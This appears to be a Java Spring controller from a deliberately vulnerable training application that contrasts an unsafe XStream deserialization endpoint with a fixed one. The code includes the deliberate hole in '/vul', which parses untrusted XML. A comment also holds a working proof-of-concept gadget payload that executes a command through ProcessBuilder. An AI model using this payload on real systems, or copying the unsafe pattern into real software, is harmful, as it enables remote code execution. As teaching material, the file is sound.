package com.best.hello.controller;

import com.thoughtworks.xstream.XStream;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

/**
 * XStream是一个简单的基于Java库，Java对象序列化到XML
 * @date 2021/08/16
 */
@RestController
@RequestMapping("/XStream")
public class XStreamVul {

    /**
     * @poc 存在多个poc
     * <sorted-set>
     *     <dynamic-proxy>
     *         <interface>java.lang.Comparable</interface>
     *         <handler class="java.beans.EventHandler">
     *             <target class="java.lang.ProcessBuilder">
     *                 <command>
     *                     <string>open</string>
     *                     <string>-a</string>
     *                     <string>Calculator</string>
     *                 </command>
     *             </target>
     *             <action>start</action>
     *         </handler>
     *     </dynamic-proxy>
     * </sorted-set>
     */
    @RequestMapping("/vul")
    public String vul(@RequestBody String content) {
        XStream xs = new XStream();
        xs.fromXML(content);
        return "XStream Vul";
    }

    @RequestMapping("/safe")
    public String safe(@RequestBody String content) {
        XStream xs = new XStream();
        // 修复：1.4.10后可用，启用默认安全配置
        XStream.setupDefaultSecurity(xs);
        xs.fromXML(content);
        return "XStream Safe";
    }
}
